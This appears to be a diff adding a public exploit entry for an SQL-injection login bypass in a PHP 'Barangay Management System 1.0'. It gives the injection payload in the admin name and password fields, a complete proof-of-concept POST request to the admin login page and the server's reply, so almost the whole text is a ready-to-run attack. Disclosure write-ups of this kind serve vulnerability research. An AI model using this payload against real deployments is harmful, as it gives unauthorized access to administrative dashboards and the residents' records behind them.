@@ -1,0 +1,42 @@
+# Exploit Title: Barangay Management System 1.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-07-05
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.sourcecodester.com/php/13484/barangay-management-system.html
+# Software Link:  https://www.sourcecodester.com/sites/default/files/download/antiokz/barangay_1.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+# my website: bkpatron.com
+
+# Vulnerability: Attacker can bypass login page and access to dashboard page
+# vulnerable file : index.php
+# Parameter & Payload: '=''or'
+# Proof of Concept:
+http://localhost/Barangay/adminlogin.php
+
+POST /Barangay/adminlogin.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Referer: http://localhost/Barangay/
+Cookie: PHPSESSID=jt0a3e89ukmktgtuoedjqmktge
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+admin_name=%27%3D%27%27or%27&admin_pass=%27%3D%27%27or%27&adminlogin=Login: undefined
+
+HTTP/1.1 200 OK
+Date: Sat, 04 Jul 2020 20:35:25 GMT
+Server: Apache/2.4.39 (Win64) PHP/7.2.18
+X-Powered-By: PHP/7.2.18
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 3638
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
